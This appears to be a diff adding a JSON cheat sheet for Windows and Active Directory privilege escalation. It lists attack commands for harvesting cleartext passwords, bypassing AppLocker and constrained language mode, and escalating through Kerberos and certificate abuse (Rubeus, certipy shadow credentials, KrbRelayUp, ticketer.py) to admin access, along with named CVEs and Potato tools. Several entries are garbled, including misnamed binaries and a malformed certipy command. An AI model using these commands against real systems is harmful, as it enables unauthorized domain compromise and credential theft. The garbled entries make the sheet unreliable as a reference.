@@ -1,0 +1,85 @@
+{
+  "Privilege Escalation from Low Access": {
+    "AppLocker_Info": {
+      "commands": [
+        "Get-ChildItem -Path HKLM:SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe (dll/msi/...)",
+        "wingpos.exe"
+      ],
+      "resources": "https://amsi.fail/"
+    },
+    "AMSI_Bypass": {
+      "methods": [
+        "Reflection method",
+        "Patching amsi.dll"
+      ]
+    },
+    "Password_Search": {
+      "command": "findstr /si password *.txt *.ini *.docx",
+      "result": "User account clear text pass"
+    },
+    "AppLocker_Whitelist_Bypass": {
+      "trusted_paths": [
+        "C:\\Windows\\Tasks",
+        "C:\\Windows\\Temp"
+      ],
+      "methods": {
+        "Powershell_CLM_bypass": {
+          "command": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\runme.exe"
+        },
+        "MSBuild": {
+          "command": "msbta.exe my.hta"
+        },
+        "other_tools": [
+          "FodHelper",
+          "WSReset",
+          "MSDT"
+        ]
+      },
+      "result": "Low access (without applocker)"
+    },
+    "Vulnerabilities": {
+      "SMBGhost": {
+        "cve": "CVE-2020-0796"
+      },
+      "HiveNightmare_SeriousSAM": {
+        "cve": "CVE-2021-36934"
+      }
+    },
+    "Service_Account_Methods": {
+      "description": "IIS/Mssql (got SEImpersonate)",
+      "tools": [
+        "RoguePotato",
+        "Juicy Potato / Lovely Potato",
+        "PrintSpoofer"
+      ]
+    },
+    "CertPotato": {
+      "initial_step": {
+        "command": "/Rubeus tgtdeleg /nowrap",
+        "result": "TGT (pass the ticket)"
+      },
+      "shadow_credentials": {
+        "commands": [
+          "certipy req -k -ca <ca> -template Machine -target <dc>",
+          "certipy auth -pfx <pfx>",
+          "certipy shadow auto -u '<machine$>@<domain>' -k account '<machine$>'"
+        ],
+        "result": "Machine NT Hash"
+      }
+    },
+    "KrbRelayUp": {
+      "commands": [
+        {
+          "create_computer": "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computerS> -ComputerPassword <password>"
+        },
+        {
+          "spawn_rbcd": "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name> -cp <computer_pass>"
+        }
+      ],
+      "final_step": {
+        "command": "ticketer.py -nthash <hash> -domain-sid <domain_sid> -domain <domain> -spn cifs/<dc> <targetUser>",
+        "result": "Admin Access"
+      }
+    }
+  }
+}
